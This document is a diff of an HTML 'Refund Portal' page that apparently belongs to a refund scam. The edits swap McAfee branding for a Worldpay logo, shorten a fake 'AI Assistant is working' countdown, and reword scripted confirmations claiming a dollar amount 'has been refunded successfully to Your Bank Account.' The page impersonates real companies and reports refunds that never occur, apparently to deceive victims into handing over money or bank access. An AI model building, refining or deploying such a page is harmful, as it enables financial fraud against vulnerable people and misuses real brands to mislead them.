@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>McAfee Refund Portal</title>
+  <title>Refund Portal</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
@@ -109,7 +109,7 @@
 <body>
 <div class="container">
   <div class="logo">
-    <img src="https://www.primelicense.com/img/m/13.jpg">
+    <img src="https://mma.prnewswire.com/media/628755/Worldpay_logo_Logo.jpg?p=facebook">
   </div>
   <form id="formContent" onsubmit="return false;">
     <div id="step0" class="step active">
@@ -174,7 +174,7 @@
           <div class="circle-loader"></div>
           <div class="countdown-text" id="timer1">2:00</div>
         </div>
-        <p>Our AI Assistant is working...</p>
+        <p>Our AI Assistant is working in the background...</p>
       </div>
     </div>
     <div id="confirmation1" class="step confirmation-page">
@@ -192,7 +192,7 @@
       <div class="loader-wrapper">
         <div class="circle-container">
           <div class="circle-loader"></div>
-          <div class="countdown-text" id="timer2">2:00</div>
+          <div class="countdown-text" id="timer2">1:00</div>
         </div>
         <p>Our AI Assistant is working in the background...</p>
       </div>
@@ -290,7 +290,7 @@ function startSecondRefund() {
 }
 
 function runCountdown(timerId, callback) {
-  let seconds = 120;
+  let seconds = 60;
   const timerEl = document.getElementById(timerId);
   const interval = setInterval(() => {
     const min = Math.floor(seconds / 60);
@@ -304,12 +304,12 @@ function runCountdown(timerId, callback) {
 }
 
 function showFirstConfirmation() {
-  document.getElementById("confirmationText1").textContent = `Your Debited Amount $${firstAmount} has been refunded successfully to Your Bank Account.`;
+  document.getElementById("confirmationText1").textContent = `Your Amount $${firstAmount} has been refunded successfully to Your Bank Account.`;
   showStep("confirmation1");
 }
 
 function showSecondConfirmation() {
-  document.getElementById("confirmationText2").textContent = `Your Debited Amount $${secondAmount} has been refunded successfully to Your Bank Account.`;
+  document.getElementById("confirmationText2").textContent = `Your Amount $${secondAmount} has been refunded successfully to Your Bank Account.`;
   showStep("finalConfirmation");
 }
 </script>
